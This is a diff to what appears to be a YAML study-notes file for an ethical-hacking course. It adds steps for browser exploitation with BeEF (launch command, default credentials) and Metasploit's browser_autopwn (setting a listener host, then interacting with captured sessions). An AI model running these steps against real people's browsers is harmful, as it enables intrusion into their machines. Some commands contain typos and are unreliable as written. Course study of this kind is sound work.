@@ -296,6 +296,30 @@ udemy:
           show payloads
           exploit  # launch exploit
       - name: 13_ vuln_browser_8
+        BeEF:
+          desc: Browser Exploitation Framework (http://beefproject.com)
+          cmd:
+            beef-xss
+            browser -> 127.0.0.1:3000
+            cred -> beef:beef
+            ihm -> online browser
+              -> machine
+              -> command
+              -> browser
+            term -> exemple
+              -> copy
+        Metasploit:
+          cmd:
+            msfconsole
+            use auxilary/server/browser_autopwn
+            show options 
+            set lhost 192.168.1.106
+            set uripath hacking
+            run
+            # give Local IP
+            borwser -> local ip
+            term -> execute exploit
+              sessions -i # check if you have sessions
       - name: 14_backdoor_10
     section_6_vuln_web:
       - name: 15_intro_9
